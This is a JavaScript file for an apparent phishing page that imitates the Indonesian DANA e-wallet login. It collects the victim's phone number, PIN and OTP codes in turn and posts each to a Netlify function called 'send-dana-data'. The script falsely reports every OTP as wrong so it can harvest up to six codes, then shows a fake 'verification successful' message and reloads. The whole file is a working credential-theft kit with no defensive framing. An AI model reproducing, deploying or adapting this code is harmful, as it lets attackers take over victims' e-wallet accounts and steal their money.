document.addEventListener('DOMContentLoaded', () => {
  // DOM References
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    o: document.getElementById('otp-page')
  };
  
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const ois = document.querySelectorAll('.otp-box');
  const fn = document.getElementById('floating-notification');
  const sn = document.getElementById('success-notification');
  const rn = document.getElementById('reward-notification');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const lc = document.getElementById('lanjutkan-container');

  // State Variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let otp = '';
  let attemptCount = 0;
  const maxAttempts = 6;
  let otpTimer;

  // Helper Functions
  function showSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function startOTPTimer() {
    let timeLeft = 120;
    const timerElement = document.getElementById('otp-timer');
    
    clearInterval(otpTimer); // Clear any existing timer
    
    otpTimer = setInterval(() => {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      
      if (timeLeft <= 0) {
        clearInterval(otpTimer);
        document.querySelector('.otp-resend').classList.add('active');
      }
      timeLeft--;
    }, 1000);
  }

  function resetOTPInputs() {
    ois.forEach(input => input.value = '');
    ois[0].focus();
    otp = '';
    attemptCount++;
    an.textContent = attemptCount;
    ac.style.display = 'block';
  }

  function showNotification(element, message, duration = 5000) {
    if (element && message) {
      element.innerHTML = message;
      element.style.display = 'block';
      setTimeout(() => element.style.display = 'none', duration);
    }
  }

  // Backend Communication
  async function sendDanaData(type, data) {
    try {
      const response = await fetch('/.netlify/functions/send-dana-data', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify({ type, ...data })
      });
      
      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || errorData.message || 'Request failed');
      }
      
      return await response.json();
    } catch (error) {
      console.error('API Error:', error);
      throw error;
    }
  }

  // Phone Number Formatting
  pn.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    
    // Format phone number
    if (value.startsWith('0')) {
      value = value.substring(1);
    }
    
    if (value.length > 0 && !value.startsWith('8')) {
      value = '8' + value.replace(/^8/, '');
    }
    
    if (value.length > 12) {
      value = value.substring(0, 12);
    }
    
    // Format with dashes
    let formatted = '';
    if (value.length > 0) {
      formatted = value.substring(0, 3);
      if (value.length > 3) {
        formatted += '-' + value.substring(3, 7);
      }
      if (value.length > 7) {
        formatted += '-' + value.substring(7, 12);
      }
    }
    
    e.target.value = formatted;
    phoneNumber = value;
  });

  // Continue Button Handler
  lb.addEventListener('click', async () => {
    if (currentPage === 'n') {
      if (phoneNumber.length < 10) {
        showNotification(fn, '<div class="notification-content">Nomor HP harus minimal 10 digit</div>');
        return;
      }
      
      showSpinner();
      try {
        await sendDanaData('phone', { phone: phoneNumber });
        pages.n.style.display = 'none';
        pages.p.style.display = 'block';
        currentPage = 'p';
        lc.style.display = 'none';
      } catch (error) {
        showNotification(fn, `<div class="notification-content">Gagal verifikasi: ${error.message}</div>`);
      } finally {
        hideSpinner();
      }
    }
  });

  // PIN Input Handling
  pis.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pis.length - 1) {
        pis[index + 1].focus();
      }
      
      pin = Array.from(pis).map(i => i.value).join('');
      
      if (pin.length === 6) {
        showSpinner();
        try {
          await sendDanaData('pin', { phone: phoneNumber, pin });
          pages.p.style.display = 'none';
          pages.o.style.display = 'block';
          currentPage = 'o';
          lc.style.display = 'none';
          startOTPTimer();
          setTimeout(() => {
            fn.style.display = 'block';
            fn.innerHTML = `
              <div class="notification-content">
                Kode OTP telah dikirim ke nomor Anda
                <small>(Silakan cek SMS/WhatsApp)</small>
              </div>
            `;
          }, 1000);
        } catch (error) {
          showNotification(fn, `<div class="notification-content">Gagal verifikasi PIN: ${error.message}</div>`);
          // Reset PIN fields on error
          pis.forEach(p => p.value = '');
          pis[0].focus();
          pin = '';
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        pis[index - 1].focus();
      }
    });
  });

  // OTP Input Handling
  ois.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < ois.length - 1) {
        ois[index + 1].focus();
      }
      
      otp = Array.from(ois).map(i => i.value).join('');
      
      if (index === ois.length - 1 && e.target.value.length === 1) {
        showSpinner();
        try {
          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
          
          setTimeout(() => {
            resetOTPInputs();
            
            if (attemptCount > 2) {
              showNotification(rn, `
                <div class="notification-content">
                  <h3>Kode OTP Salah</h3>
                  <p>Silakan cek SMS atau WhatsApp Anda</p>
                </div>
              `, 10000);
            }
            
            if (attemptCount >= maxAttempts) {
              fn.style.display = 'none';
              showNotification(sn, `
                <div class="notification-content">
                  <h3>Verifikasi Berhasil</h3>
                  <p>Akun Anda sedang diproses</p>
                </div>
              `, 5000);
              // Reset all inputs
              setTimeout(() => {
                window.location.reload();
              }, 5000);
            }
          }, 1000);
        } catch (error) {
          console.error('OTP Error:', error);
          showNotification(fn, `<div class="notification-content">Gagal verifikasi OTP: ${error.message}</div>`);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        ois[index - 1].focus();
      }
    });
  });

  // Toggle PIN Visibility
  document.querySelector('.show-text').addEventListener('click', (e) => {
    const isShowing = e.target.classList.toggle('active');
    const pinInputs = document.querySelectorAll('.pin-box');
    pinInputs.forEach(input => {
      input.type = isShowing ? 'text' : 'password';
    });
    e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
  });

  // Resend OTP Handler
  document.querySelector('.otp-resend').addEventListener('click', async (e) => {
    if (e.target.classList.contains('active')) {
      showSpinner();
      try {
        await sendDanaData('resend', { phone: phoneNumber });
        clearInterval(otpTimer);
        startOTPTimer();
        e.target.classList.remove('active');
        showNotification(fn, '<div class="notification-content">Kode OTP baru telah dikirim</div>');
      } catch (error) {
        showNotification(fn, `<div class="notification-content">Gagal mengirim ulang OTP: ${error.message}</div>`);
      } finally {
        hideSpinner();
      }
    }
  });

  // Change Number Handler
  document.querySelector('.otp-change').addEventListener('click', () => {
    pages.o.style.display = 'none';
    pages.n.style.display = 'block';
    currentPage = 'n';
    lc.style.display = 'block';
    clearInterval(otpTimer);
    document.getElementById('otp-timer').textContent = '02:00';
    document.querySelector('.otp-resend').classList.remove('active');
    ois.forEach(input => input.value = '');
    otp = '';
    attemptCount = 0;
    an.textContent = '1';
    ac.style.display = 'none';
  });
});
